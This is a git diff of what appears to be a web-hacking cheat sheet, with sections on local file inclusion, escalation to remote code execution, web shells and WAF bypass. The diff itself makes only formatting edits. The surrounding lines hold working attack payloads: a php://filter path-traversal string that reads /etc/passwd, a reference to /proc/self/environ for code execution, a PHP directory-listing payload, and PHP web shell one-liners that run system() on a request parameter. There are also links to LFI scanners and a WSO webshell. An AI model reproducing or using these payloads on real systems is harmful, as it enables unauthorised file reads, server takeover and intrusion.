@@ -408,12 +408,12 @@ php://filter/convert.base64-encode/resource=dog/../../../etc/passwd
 ```
 >[lfi scan ](https://github.com/halohashm79/lfi-scan)
 ```
-python lfi.py
-```
+>python lfi.py
+
 >next
 >tool for php filter and full
 [lfi scan all](https://github.com/Chocapikk/LFIHunt)
->
+
 
 ># lfi to rce
 > /proc/self/environ
@@ -575,9 +575,7 @@ url=https://github.com/mIcHyAmRaNe/wso-webshell/blob/master/wso.php
 ```
 >shortlink to shell
 ```
-shhortlink web scan
 payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
-
 ```
 ### waf
 >website
@@ -591,6 +589,7 @@ payalod=<?php $dir='.'; $file = scandir($dir); print_r($file); ?>
 >[github waf](https://github.com/0xInfection/Awesome-WAF)
 >
 >link to web
+
 ```
 <?php system($_GET['cmd']);?
 <?php system('pwd'); ?>
